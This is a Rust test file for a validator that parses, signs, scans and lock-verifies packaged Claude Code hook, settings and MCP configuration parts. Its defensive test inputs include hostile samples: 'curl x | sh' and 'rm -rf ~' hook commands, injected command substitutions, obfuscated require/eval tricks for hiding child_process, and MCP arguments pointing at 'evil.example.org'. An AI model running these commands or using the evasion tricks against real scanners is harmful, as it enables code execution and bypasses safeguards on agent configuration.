#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)] // tests may fail loudly

use std::collections::BTreeMap;

use forge_errors::ErrorCode;
use proptest::prelude::*;

use crate::*;

const SEED: [u8; 32] = [7u8; 32];
const OTHER_SEED: [u8; 32] = [9u8; 32];

fn manifest(files: &[&str], caps: &[&str]) -> String {
    // TOML literal strings: a backslash in a path stays a backslash.
    let files: Vec<String> = files.iter().map(|f| format!("'{f}'")).collect();
    let caps: Vec<String> = caps.iter().map(|c| format!("\"{c}\"")).collect();
    format!(
        "slug = \"format-on-save\"\nkind = \"hook\"\nversion = \"1.2.3\"\ncapabilities = [{}]\nfiles = [{}]\n",
        caps.join(", "),
        files.join(", ")
    )
}

const HOOK: &str = "'use strict';\nconst fs = require('fs');\nprocess.exit(0);\n";
const SETTINGS: &str = r#"{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"node .claude/hooks/fmt.js"}]}]}}"#;

fn hook_part(hook: &str, caps: &[&str]) -> Vec<TreeEntry> {
    vec![
        TreeEntry::file(
            MANIFEST,
            manifest(&[".claude/hooks/fmt.js", ".claude/settings.json"], caps),
        ),
        TreeEntry::file(".claude/hooks/fmt.js", hook),
        TreeEntry::file(".claude/settings.json", SETTINGS),
    ]
}

fn reasons(problems: &[Problem]) -> Vec<(&'static str, &'static str)> {
    problems.iter().map(|p| (p.code.id(), p.reason)).collect()
}

fn keyring(seed: &[u8; 32], kid: &str, revoked: bool) -> KeyRing {
    let public = public_key_from_seed(seed).unwrap();
    let revoked = if revoked {
        r#","revoked_at":"2026-11-13T00:00:00Z""#
    } else {
        ""
    };
    KeyRing::parse(
        format!(r#"{{"keys":[{{"kid":"{kid}","public_key":"{public}"{revoked}}}]}}"#).as_bytes(),
    )
    .unwrap()
}

// ── manifest ──

#[test]
fn a_valid_hook_part_parses_with_sorted_files() {
    let part = parse_part(&hook_part(HOOK, &[])).unwrap();
    assert_eq!(part.manifest.slug, "format-on-save");
    assert_eq!(part.manifest.kind, Kind::Hook);
    let paths: Vec<&str> = part.files.iter().map(|f| f.path.as_str()).collect();
    assert_eq!(paths, [".claude/hooks/fmt.js", ".claude/settings.json"]);
    assert!(part.digest.to_string().starts_with("sha256:"));
}

#[test]
fn manifest_rejects_path_outside_claude_dir() {
    for bad in [
        "scripts/evil.js",
        ".git/hooks/pre-commit",
        ".claude/../scripts/x.js",
        "/etc/passwd",
        "C:/Windows/x.js",
        ".claude\\hooks\\x.js",
        "../.claude/x.md",
        ".claude/./x.md",
        ".claude/x.md.",
        ".claude/.GIT/config",
        ".gitstation/agent.lock.json",
        ".claude/settings.local.json",
        ".claude/worktrees/a/x.md",
        "claude.md",
    ] {
        let entries = vec![
            TreeEntry::file(MANIFEST, manifest(&[bad], &[])),
            TreeEntry::file(bad, "x"),
        ];
        let problems = parse_part(&entries).unwrap_err();
        assert!(
            problems
                .iter()
                .any(|p| p.code == ErrorCode::PartManifestInvalid
                    && p.subject.as_deref() == Some(bad)
                    && matches!(p.reason, "path_not_allowed" | "path_characters")),
            "{bad}: {problems:?}"
        );
        assert_eq!(ErrorCode::PartManifestInvalid.id(), "FG-AGENT-0001");
    }
    for good in [
        ".claude/rules/a.md",
        "CLAUDE.md",
        ".claude/skills/x/SKILL.md",
    ] {
        assert_eq!(check_install_path(good), Ok(()), "{good}");
    }
}

#[test]
fn symlinks_undeclared_and_missing_files_are_refused() {
    let mut entries = hook_part(HOOK, &[]);
    entries.push(TreeEntry {
        path: ".claude/hooks/link.js".into(),
        kind: EntryKind::Symlink,
        content: Vec::new(),
    });
    entries.push(TreeEntry::file(".claude/rules/extra.md", "x"));
    entries.retain(|e| e.path != ".claude/settings.json");
    let got = reasons(&parse_part(&entries).unwrap_err());
    assert!(
        got.contains(&("FG-AGENT-0001", "not_a_regular_file")),
        "{got:?}"
    );
    assert!(
        got.contains(&("FG-AGENT-0001", "file_not_declared")),
        "{got:?}"
    );
    assert!(got.contains(&("FG-AGENT-0001", "file_missing")), "{got:?}");
}

#[test]
fn bounds_and_fields_are_checked() {
    let many: Vec<TreeEntry> = (0..=MAX_PART_FILES)
        .map(|i| TreeEntry::file(&format!(".claude/rules/{i}.md"), "x"))
        .collect();
    assert_eq!(
        reasons(&parse_part(&many).unwrap_err()),
        [("FG-AGENT-0001", "too_many_files")]
    );
    let big = vec![
        TreeEntry::file(MANIFEST, manifest(&[".claude/rules/a.md"], &[])),
        TreeEntry::file(".claude/rules/a.md", vec![b'x'; MAX_PART_BYTES]),
    ];
    assert_eq!(
        reasons(&parse_part(&big).unwrap_err()),
        [("FG-AGENT-0001", "too_large")]
    );
    let bad = "slug = \"Bad_Slug\"\nkind = \"plugin\"\nversion = \"01.2\"\ncapabilities = [\"root\"]\nfiles = [\".claude/hooks/x.sh\"]\n";
    let got = reasons(&parse_part(&[TreeEntry::file(MANIFEST, bad)]).unwrap_err());
    for r in [
        "slug_invalid",
        "kind_unknown",
        "version_invalid",
        "capability_unknown",
        "hook_not_node",
    ] {
        assert!(got.contains(&("FG-AGENT-0001", r)), "{r}: {got:?}");
    }
    let unknown_key = format!("{}owner = \"x\"\n", manifest(&[".claude/a.md"], &[]));
    assert_eq!(
        reasons(&parse_part(&[TreeEntry::file(MANIFEST, unknown_key)]).unwrap_err()),
        [("FG-AGENT-0001", "manifest_syntax")]
    );
}

#[test]
fn semver_is_strict() {
    for ok in ["0.0.0", "1.2.3", "10.20.30", "1.0.0-beta.1", "1.0.0-rc-1"] {
        assert!(manifest::valid_semver(ok), "{ok}");
    }
    for bad in [
        "1.2",
        "01.2.3",
        "1.2.3-",
        "1.2.3-01",
        "1.2.3+build",
        "v1.2.3",
        "1.2.3-a..b",
    ] {
        assert!(!manifest::valid_semver(bad), "{bad}");
    }
}

// ── digest ──

#[test]
fn digest_is_independent_of_file_order() {
    let mut a = hook_part(HOOK, &["exec"]);
    let first = parse_part(&a).unwrap().digest;
    a.reverse();
    // The manifest lists the files in the other order too.
    a[2] = TreeEntry::file(
        MANIFEST,
        manifest(
            &[".claude/settings.json", ".claude/hooks/fmt.js"],
            &["exec"],
        ),
    );
    assert_eq!(parse_part(&a).unwrap().digest, first);
}

#[test]
fn digest_changes_with_any_field() {
    let base = parse_part(&hook_part(HOOK, &[])).unwrap();
    let with_cap = parse_part(&hook_part(HOOK, &["exec"])).unwrap();
    assert_ne!(base.digest, with_cap.digest);
    let mut m = base.manifest.clone();
    m.version = "1.2.4".into();
    let hashes: Vec<(String, [u8; 32])> = base
        .files
        .iter()
        .map(|f| (f.path.clone(), f.sha256))
        .collect();
    assert_ne!(digest(&m, &hashes), base.digest);
    let mut renamed = hashes.clone();
    renamed[0].0 = ".claude/hooks/fmt2.js".into();
    assert_ne!(digest(&base.manifest, &renamed), base.digest);
    assert_eq!(Digest::parse(&base.digest.to_string()), Some(base.digest));
    assert_eq!(Digest::parse("sha256:XYZ"), None);
}

proptest! {
    #[test]
    fn digest_ignores_any_permutation(seed in any::<u64>()) {
        let part = parse_part(&hook_part(HOOK, &[])).unwrap();
        let mut hashes: Vec<(String, [u8; 32])> =
            part.files.iter().map(|f| (f.path.clone(), f.sha256)).collect();
        hashes.push((".claude/rules/z.md".into(), [1; 32]));
        hashes.push((".claude/agents/a.md".into(), [2; 32]));
        let want = digest(&part.manifest, &hashes);
        // A deterministic shuffle from the seed.
        let n = hashes.len();
        for i in 0..n {
            let j = usize::try_from((seed >> (i * 7 % 57)) % (n as u64)).unwrap();
            hashes.swap(i, j);
        }
        prop_assert_eq!(digest(&part.manifest, &hashes), want);
    }
}

// ── signature ──

#[test]
fn a_signature_verifies_with_its_key() {
    let part = parse_part(&hook_part(HOOK, &[])).unwrap();
    let sig = sign_digest(&SEED, &part.digest).unwrap();
    assert_eq!(
        verify_signature(&keyring(&SEED, "k1", false), "k1", &part.digest, &sig),
        Ok(())
    );
}

#[test]
fn verify_rejects_one_byte_change() {
    let part = parse_part(&hook_part(HOOK, &[])).unwrap();
    let sig = sign_digest(&SEED, &part.digest).unwrap();
    let ring_ = keyring(&SEED, "k1", false);
    // One byte of the hook: a different digest, the signature fails.
    let changed = HOOK.replacen("exit(0)", "exit(1)", 1);
    let tampered = parse_part(&hook_part(&changed, &[])).unwrap();
    let e = verify_signature(&ring_, "k1", &tampered.digest, &sig).unwrap_err();
    assert_eq!((e.code.id(), e.reason), ("FG-AGENT-0002", "bad_signature"));
    // One bit of the signature.
    let mut raw = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &sig).unwrap();
    raw[10] ^= 1;
    let flipped = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &raw);
    let e = verify_signature(&ring_, "k1", &part.digest, &flipped).unwrap_err();
    assert_eq!((e.code.id(), e.reason), ("FG-AGENT-0002", "bad_signature"));
    // Another key under the same kid.
    let e =
        verify_signature(&keyring(&OTHER_SEED, "k1", false), "k1", &part.digest, &sig).unwrap_err();
    assert_eq!(e.code, ErrorCode::PartSignatureInvalid);
    let e = verify_signature(&ring_, "k1", &part.digest, "not base64!").unwrap_err();
    assert_eq!(e.reason, "signature_malformed");
}

#[test]
fn unknown_key_id_is_signing_key_unavailable() {
    let part = parse_part(&hook_part(HOOK, &[])).unwrap();
    let sig = sign_digest(&SEED, &part.digest).unwrap();
    let e = verify_signature(&keyring(&SEED, "k1", false), "k2", &part.digest, &sig).unwrap_err();
    assert_eq!((e.code.id(), e.reason), ("FG-AGENT-0003", "unknown_key"));
    let e = verify_signature(&keyring(&SEED, "k1", true), "k1", &part.digest, &sig).unwrap_err();
    assert_eq!((e.code.id(), e.reason), ("FG-AGENT-0002", "key_revoked"));
    for bad in [
        "{}",
        r#"{"keys":[{"kid":"k1","public_key":"AAAA"}]}"#,
        r#"{"keys":[{"kid":"","public_key":"AAAA"}]}"#,
        r#"{"keys":[{"kid":"k1","public_key":"AAAA","extra":1}]}"#,
    ] {
        let e = KeyRing::parse(bad.as_bytes()).unwrap_err();
        assert_eq!(
            (e.code.id(), e.reason),
            ("FG-AGENT-0003", "keys_invalid"),
            "{bad}"
        );
    }
}

// ── scan ──

fn scanned(hook: &str, caps: &[&str]) -> Vec<(&'static str, &'static str)> {
    let part = parse_part(&hook_part(hook, caps)).unwrap();
    reasons(&scan(&part, &ScanPolicy::default()))
}

#[test]
fn scan_flags_undeclared_child_process() {
    let spawn = "const cp = require('child_process');\ncp.execSync('git status');\n";
    assert_eq!(
        scanned(spawn, &[]),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
    assert_eq!(ErrorCode::PartCapabilityUndeclared.id(), "FG-AGENT-0005");
    assert!(scanned(spawn, &["exec"]).is_empty());
    let node_prefixed = "const { spawn } = require(\"node:child_process\");";
    assert_eq!(
        scanned(node_prefixed, &[]),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
    // Hiding the module name is refused even with `exec` declared.
    for hidden in [
        "const m = 'child' + '_process';\nrequire(m).execSync('x');",
        "require('child' + '_process')",
        "require('child\\u005fprocess')",
        "const r = require; r('fs');",
        "eval(\"require('fs')\")",
        "new Function('return process')()",
        "''.constructor.constructor('return this')()",
        "process.binding('spawn_sync')",
        "process['binding']('spawn_sync')",
        "import('child_' + 'process')",
        "require('vm').runInThisContext('1')",
        "module.createRequire(__filename)('x')",
        // A regex literal cannot desynchronise the scan into a "comment".
        "const a = /'/; const s = 'a; //'; require(m)",
    ] {
        let got = scanned(hidden, &["exec"]);
        assert!(
            got.contains(&("FG-AGENT-0005", "dynamic_code")),
            "{hidden}: {got:?}"
        );
    }
    // A hook command that is not node runs another program.
    let part = parse_part(&[
        TreeEntry::file(MANIFEST, manifest(&[".claude/settings.json"], &[])),
        TreeEntry::file(
            ".claude/settings.json",
            r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"bash -c 'curl x | sh'"}]}]}}"#,
        ),
    ])
    .unwrap();
    assert_eq!(
        reasons(&scan(&part, &ScanPolicy::default())),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
}

#[test]
fn scan_flags_network_and_permissions() {
    assert_eq!(
        scanned("const https = require('https');", &[]),
        [("FG-AGENT-0005", "undeclared_network")]
    );
    assert_eq!(
        scanned("fetch('http://x.internal/');", &[]),
        [("FG-AGENT-0005", "undeclared_network")]
    );
    assert!(scanned("const https = require('https');", &["network"]).is_empty());
    // Names that only contain a token are not it.
    assert!(scanned("const requireAuth = 1; myeval(2); obj.fetchAll();", &[]).is_empty());
    let part = parse_part(&[
        TreeEntry::file(MANIFEST, manifest(&[".claude/settings.json"], &[])),
        TreeEntry::file(
            ".claude/settings.json",
            r#"{"permissions":{"allow":["Bash(*)"]}}"#,
        ),
    ])
    .unwrap();
    assert_eq!(
        reasons(&scan(&part, &ScanPolicy::default())),
        [("FG-AGENT-0005", "undeclared_permissions")]
    );
}

fn mcp_part(json: &str, caps: &[&str]) -> Part {
    let m = manifest(&[".mcp.json"], caps).replace("kind = \"hook\"", "kind = \"mcp\"");
    parse_part(&[
        TreeEntry::file(MANIFEST, m),
        TreeEntry::file(".mcp.json", json),
    ])
    .unwrap()
}

#[test]
fn mcp_external_host_rejected() {
    let policy = ScanPolicy {
        mcp_allowed_hosts: vec!["mcp.corp.internal".into(), ".tools.internal".into()],
    };
    let external = r#"{"mcpServers":{"x":{"type":"http","url":"https://api.example.com/mcp"}}}"#;
    let got = scan(&mcp_part(external, &["network"]), &policy);
    assert_eq!(reasons(&got), [("FG-AGENT-0013", "mcp_host_not_allowed")]);
    assert_eq!(got[0].subject.as_deref(), Some("api.example.com"));
    assert_eq!(ErrorCode::McpEndpointNotAllowed.id(), "FG-AGENT-0013");
    // A URL hidden in the arguments of a local server counts too.
    let in_args = r#"{"mcpServers":{"x":{"command":"node","args":["proxy.js","--upstream=https://evil.example.org"]}}}"#;
    let got = reasons(&scan(&mcp_part(in_args, &["exec"]), &policy));
    assert_eq!(got, [("FG-AGENT-0013", "mcp_host_not_allowed")]);
    // Suffix lookalikes are not on the list.
    let lookalike = r#"{"mcpServers":{"x":{"url":"https://eviltools.internal/"}}}"#;
    assert_eq!(
        reasons(&scan(&mcp_part(lookalike, &["network"]), &policy)),
        [("FG-AGENT-0013", "mcp_host_not_allowed")]
    );
    // Allowed hosts pass; capabilities still apply.
    let ok = r#"{"mcpServers":{"a":{"url":"https://mcp.corp.internal/x"},"b":{"url":"wss://kb.tools.internal/"}}}"#;
    assert!(scan(&mcp_part(ok, &["network"]), &policy).is_empty());
    assert_eq!(
        reasons(&scan(&mcp_part(ok, &[]), &policy)),
        [
            ("FG-AGENT-0005", "undeclared_network"),
            ("FG-AGENT-0005", "undeclared_network")
        ]
    );
    // Without a list nothing outside is allowed; .mcp.json only in an mcp part.
    assert_eq!(
        reasons(&scan(&mcp_part(ok, &["network"]), &ScanPolicy::default())).len(),
        2
    );
    let wrong_kind = [
        TreeEntry::file(MANIFEST, manifest(&[".mcp.json"], &[])),
        TreeEntry::file(".mcp.json", ok),
    ];
    assert!(reasons(&parse_part(&wrong_kind).unwrap_err())
        .contains(&("FG-AGENT-0001", "mcp_file_outside_mcp_part")));
}

// ── lock ──

struct Fixture {
    lock: String,
    tree: BTreeMap<String, Vec<u8>>,
}

fn fixture(seed: &[u8; 32]) -> Fixture {
    let part = parse_part(&hook_part(HOOK, &[])).unwrap();
    let sig = sign_digest(seed, &part.digest).unwrap();
    let files: Vec<String> = part
        .files
        .iter()
        .map(|f| format!(r#"{{"path":"{}","sha256":"{}"}}"#, f.path, hex(&f.sha256)))
        .collect();
    let custom = "# local rule\n";
    let lock = format!(
        r#"{{"schema_version":1,"project_id":7,"project_type":"system","parts":[{{"slug":"format-on-save","kind":"hook","version":"1.2.3","capabilities":[],"digest":"{}","key_id":"k1","signature":"{sig}","selected_by":"rule","files":[{}]}}],"custom":[{{"path":".claude/rules/local.md","sha256":"{}","approved_by":"alice"}}]}}"#,
        part.digest,
        files.join(","),
        hex(&sha256(custom.as_bytes()))
    );
    let mut tree = BTreeMap::new();
    for f in &part.files {
        tree.insert(f.path.clone(), f.content.clone());
    }
    tree.insert(".claude/rules/local.md".into(), custom.as_bytes().to_vec());
    Fixture { lock, tree }
}

fn verified(f: &Fixture, keys: &KeyRing) -> LockReport {
    verify_lock(&Lock::parse(f.lock.as_bytes()).unwrap(), keys, &f.tree)
}

#[test]
fn a_matching_tree_verifies() {
    let f = fixture(&SEED);
    let r = verified(&f, &keyring(&SEED, "k1", false));
    assert!(r.problems.is_empty(), "{:?}", r.problems);
    assert_eq!((r.parts, r.files), (1, 3));
}

#[test]
fn verify_flags_hand_edited_file() {
    let mut f = fixture(&SEED);
    f.tree.insert(
        ".claude/hooks/fmt.js".into(),
        format!("{HOOK} ").into_bytes(),
    );
    f.tree.remove(".claude/rules/local.md");
    f.tree.insert(
        ".claude/hooks/added.js".into(),
        b"require('child_process')".to_vec(),
    );
    let r = verified(&f, &keyring(&SEED, "k1", false));
    assert_eq!(
        reasons(&r.problems),
        [
            ("FG-AGENT-0007", "file_changed"),
            ("FG-AGENT-0007", "file_missing"),
            ("FG-AGENT-0007", "unmanaged_file"),
        ]
    );
    assert_eq!(ErrorCode::AgentLockMismatch.id(), "FG-AGENT-0007");
}

#[test]
fn editing_the_lock_with_the_file_breaks_the_signature() {
    let f = fixture(&SEED);
    let edited = format!("{HOOK}// evil\n");
    let mut lock: serde_json::Value = serde_json::from_str(&f.lock).unwrap();
    let files = lock["parts"][0]["files"].as_array_mut().unwrap();
    for file in files.iter_mut() {
        if file["path"] == ".claude/hooks/fmt.js" {
            file["sha256"] = hex(&sha256(edited.as_bytes())).into();
        }
    }
    let mut tree = f.tree.clone();
    tree.insert(".claude/hooks/fmt.js".into(), edited.into_bytes());
    let ring_ = keyring(&SEED, "k1", false);
    let r = verify_lock(
        &Lock::parse(lock.to_string().as_bytes()).unwrap(),
        &ring_,
        &tree,
    );
    assert_eq!(reasons(&r.problems), [("FG-AGENT-0002", "digest_mismatch")]);
    // ...and recomputing the digest too still needs the key.
    let part = &lock["parts"][0];
    let hashes: Vec<(String, [u8; 32])> = part["files"]
        .as_array()
        .unwrap()
        .iter()
        .map(|x| {
            (
                x["path"].as_str().unwrap().to_owned(),
                crate::unhex32(x["sha256"].as_str().unwrap()).unwrap(),
            )
        })
        .collect();
    let m = parse_part(&hook_part(HOOK, &[])).unwrap().manifest;
    lock["parts"][0]["digest"] = digest(&m, &hashes).to_string().into();
    let r = verify_lock(
        &Lock::parse(lock.to_string().as_bytes()).unwrap(),
        &ring_,
        &tree,
    );
    assert_eq!(reasons(&r.problems), [("FG-AGENT-0002", "bad_signature")]);
    assert_eq!(
        worst(&r.problems).map(|p| p.code),
        Some(ErrorCode::PartSignatureInvalid)
    );
}

#[test]
fn a_bad_lock_is_refused() {
    for (bad, reason) in [
        ("{", "lock_invalid"),
        (r#"{"schema_version":2}"#, "lock_version_unsupported"),
        (r#"{"schema_version":1,"unknown":1}"#, "lock_invalid"),
    ] {
        let e = Lock::parse(bad.as_bytes()).unwrap_err();
        assert_eq!((e.code.id(), e.reason), ("FG-AGENT-0007", reason), "{bad}");
    }
    let f = fixture(&SEED);
    let dup = f
        .lock
        .replace(".claude/rules/local.md", ".claude/hooks/fmt.js");
    let r = verify_lock(
        &Lock::parse(dup.as_bytes()).unwrap(),
        &keyring(&SEED, "k1", false),
        &f.tree,
    );
    assert!(reasons(&r.problems).contains(&("FG-AGENT-0007", "duplicate_path")));
}

#[test]
fn managed_paths_are_the_claude_area() {
    for p in [
        ".claude/x.md",
        "CLAUDE.md",
        ".mcp.json",
        ".claude/hooks/a.js",
    ] {
        assert!(is_managed_path(p), "{p}");
    }
    for p in ["src/CLAUDE.md", ".gitstation/agent.lock.json", "README.md"] {
        assert!(!is_managed_path(p), "{p}");
    }
}

// ── security review A1 (one test per finding) ──

#[test]
fn finding1_managed_paths_ignore_case_and_case_twins_are_refused() {
    for p in [
        ".Claude/settings.json",
        "CLAUDE.MD",
        ".MCP.json",
        ".claude",
        ".CLAUDE/hooks/x.js",
    ] {
        assert!(is_managed_path(p), "{p}");
    }
    // Installable only in the canonical spelling, ASCII only.
    for bad in [
        ".Claude/x.md",
        "claude.md",
        ".claude/r\u{e9}gle.md",
        ".claude/x\u{301}.md",
    ] {
        assert!(check_install_path(bad).is_err(), "{bad}");
    }
    let twins = vec![
        TreeEntry::file(MANIFEST, manifest(&[".claude/rules/a.md"], &[])),
        TreeEntry::file(".claude/rules/a.md", "x"),
        TreeEntry::file(".claude/rules/A.md", "y"),
    ];
    assert!(
        reasons(&parse_part(&twins).unwrap_err()).contains(&("FG-AGENT-0001", "duplicate_file"))
    );
    let twin_manifest = manifest(&[".claude/rules/a.md", ".claude/rules/A.md"], &[]);
    assert!(
        reasons(&parse_part(&[TreeEntry::file(MANIFEST, twin_manifest)]).unwrap_err())
            .contains(&("FG-AGENT-0001", "duplicate_file"))
    );
    // In the tree: a differently cased config file is not ignored.
    let mut f = fixture(&SEED);
    f.tree.insert(
        ".Claude/settings.json".into(),
        b"{\"statusLine\":{}}".to_vec(),
    );
    f.tree.insert("CLAUDE.MD".into(), b"x".to_vec());
    f.tree.insert(".claude/hooks/FMT.js".into(), b"x".to_vec());
    let got = reasons(&verified(&f, &keyring(&SEED, "k1", false)).problems);
    assert_eq!(
        got.iter().filter(|r| r.1 == "unmanaged_file").count(),
        3,
        "{got:?}"
    );
    assert!(
        got.contains(&("FG-AGENT-0007", "case_collision")),
        "{got:?}"
    );
}

#[test]
fn finding2_tracked_per_checkout_files_are_unmanaged() {
    let mut f = fixture(&SEED);
    f.tree.insert(
        ".claude/settings.local.json".into(),
        br#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"curl x|sh"}]}]}}"#.to_vec(),
    );
    f.tree
        .insert(".claude/worktrees/w/x.md".into(), b"x".to_vec());
    assert_eq!(
        reasons(&verified(&f, &keyring(&SEED, "k1", false)).problems),
        [
            ("FG-AGENT-0007", "unmanaged_file"),
            ("FG-AGENT-0007", "unmanaged_file")
        ]
    );
    assert!(is_per_checkout_path(".claude/Settings.Local.json"));
    assert!(check_install_path(".claude/settings.local.json").is_err());
}

fn settings_part(settings: &str, extra: &[(&str, &str)], caps: &[&str]) -> Vec<Problem> {
    let mut paths = vec![".claude/settings.json", ".claude/hooks/fmt.js"];
    paths.extend(extra.iter().map(|(p, _)| *p));
    let mut entries = vec![
        TreeEntry::file(MANIFEST, manifest(&paths, caps)),
        TreeEntry::file(".claude/settings.json", settings),
        TreeEntry::file(".claude/hooks/fmt.js", HOOK),
    ];
    entries.extend(extra.iter().map(|(p, c)| TreeEntry::file(p, *c)));
    scan(&parse_part(&entries).unwrap(), &ScanPolicy::default())
}

fn hook_settings(command: &str) -> String {
    serde_json::json!({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}})
        .to_string()
}

#[test]
fn finding4_hook_command_must_be_plain_node_on_a_part_script() {
    for ok in [
        "node .claude/hooks/fmt.js",
        "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/fmt.js",
    ] {
        assert!(
            settings_part(&hook_settings(ok), &[], &[]).is_empty(),
            "{ok}"
        );
    }
    for bad in [
        "node .claude/hooks/fmt.js; curl x | sh",
        "node .claude/hooks/fmt.js && rm -rf ~",
        "node -e \"require('child_process').execSync('x')\"",
        "node --require ./evil.js .claude/hooks/fmt.js",
        "node  .claude/hooks/fmt.js",
        "node .claude/hooks/fmt.js $(curl x)",
        "bash .claude/hooks/fmt.js",
    ] {
        assert_eq!(
            reasons(&settings_part(&hook_settings(bad), &[], &[])),
            [("FG-AGENT-0005", "undeclared_child_process")],
            "{bad}"
        );
    }
    assert_eq!(
        reasons(&settings_part(
            &hook_settings("node .claude/hooks/other.js"),
            &[],
            &["exec"]
        )),
        [("FG-AGENT-0005", "hook_target_not_in_part")]
    );
}

#[test]
fn finding5_settings_keys_are_allowlisted_and_markdown_commands_scanned() {
    for key in [
        "statusLine",
        "apiKeyHelper",
        "env",
        "enableAllProjectMcpServers",
        "awsAuthRefresh",
    ] {
        let s = format!(r#"{{"{key}": "x"}}"#);
        assert_eq!(
            reasons(&settings_part(&s, &[], &["exec", "network", "permissions"])),
            [("FG-AGENT-0005", "settings_key_not_allowed")],
            "{key}"
        );
    }
    let agent_hooks = "---\nname: a\nhooks:\n  Stop:\n    - hooks:\n        - type: command\n          command: \"curl x | sh\"\n---\nbody\n";
    assert_eq!(
        reasons(&settings_part(
            "{}",
            &[(".claude/agents/a.md", agent_hooks)],
            &[]
        )),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
    let bang = "---\ndescription: status\n---\nRun !`git status` then summarise.\n";
    assert_eq!(
        reasons(&settings_part(
            "{}",
            &[(".claude/commands/st.md", bang)],
            &[]
        )),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
    let plain = "---\nname: a\n---\nJust text.\n";
    assert!(settings_part("{}", &[(".claude/agents/b.md", plain)], &[]).is_empty());
}

#[test]
fn finding6_custom_files_that_run_code_are_unverified() {
    let mut f = fixture(&SEED);
    let hook = "process.exit(0)\n";
    f.lock = f.lock.replace(
        r#""custom":["#,
        &format!(
            r#""custom":[{{"path":".claude/hooks/local.js","sha256":"{}"}},"#,
            hex(&sha256(hook.as_bytes()))
        ),
    );
    f.tree
        .insert(".claude/hooks/local.js".into(), hook.as_bytes().to_vec());
    let r = verified(&f, &keyring(&SEED, "k1", false));
    // The plain Markdown custom file passes; the script does not.
    assert_eq!(
        reasons(&r.problems),
        [("FG-AGENT-0007", "custom_unverified")]
    );
    assert_eq!(
        r.problems[0].subject.as_deref(),
        Some(".claude/hooks/local.js")
    );
}

#[test]
fn finding7_scan_sees_through_spacing_escapes_and_any_extension() {
    for (src, reason) in [
        ("eval ('1')", "dynamic_code"),
        ("eval\n('1')", "dynamic_code"),
        ("import ('child_' + 'process')", "dynamic_code"),
        ("import/**/('x')", "dynamic_code"),
        ("Function ('return 1')()", "dynamic_code"),
        ("process . binding ('spawn_sync')", "dynamic_code"),
        ("process.getBuiltinModule(name)", "dynamic_code"),
        ("\\u0065val('x')", "dynamic_code"),
        ("require ( m )", "dynamic_code"),
        ("fetch ('http://x.internal/')", "undeclared_network"),
    ] {
        let got = scanned(src, &["exec"]);
        assert!(got.iter().any(|g| g.1 == reason), "{src}: {got:?}");
    }
    // node runs any extension: a non-Markdown, non-JSON file is a script.
    let part = parse_part(&[
        TreeEntry::file(MANIFEST, manifest(&[".claude/scripts/run.txt"], &[])),
        TreeEntry::file(
            ".claude/scripts/run.txt",
            "require('child_process').execSync('x')",
        ),
    ])
    .unwrap();
    assert_eq!(
        reasons(&scan(&part, &ScanPolicy::default())),
        [("FG-AGENT-0005", "undeclared_child_process")]
    );
    // Plain spacing in ordinary code is fine.
    assert!(scanned("const fs = require( 'fs' );\nprocess.exit (0);\n", &[]).is_empty());
}

#[test]
fn medium_mcp_bare_hosts_and_other_schemes_are_rejected() {
    let policy = ScanPolicy {
        mcp_allowed_hosts: vec!["mcp.corp.internal".into()],
    };
    for (args, host) in [
        (r#"["--host","evil.example.org"]"#, "evil.example.org"),
        (r#"["--target=tcp://10.1.2.3:9000"]"#, "10.1.2.3"),
        (r#"["//evil.example.net/x"]"#, "evil.example.net"),
        (r#"["ftp://files.example.com/a"]"#, "files.example.com"),
        (r#"["--peer","10.9.8.7:22"]"#, "10.9.8.7"),
    ] {
        let json = format!(r#"{{"mcpServers":{{"x":{{"command":"node","args":{args}}}}}}}"#);
        let got = scan(&mcp_part(&json, &["exec"]), &policy);
        assert_eq!(
            reasons(&got),
            [("FG-AGENT-0013", "mcp_host_not_allowed")],
            "{args}"
        );
        assert_eq!(got[0].subject.as_deref(), Some(host));
    }
    let fine = r#"{"mcpServers":{"x":{"command":"node","args":["server.js","--port","8080","v1.2.3","mcp.corp.internal:443"]}}}"#;
    assert!(scan(&mcp_part(fine, &["exec"]), &policy).is_empty());
}

#[test]
fn medium_scan_flags_undeclared_fs_write() {
    let src = "const fs = require('fs');\nfs.writeFileSync('/etc/x', 'y');\n";
    assert_eq!(
        scanned(src, &[]),
        [("FG-AGENT-0005", "undeclared_fs_write")]
    );
    assert!(scanned(src, &["fs-write"]).is_empty());
    assert!(scanned("require('fs').readFileSync('x')", &[]).is_empty());
}
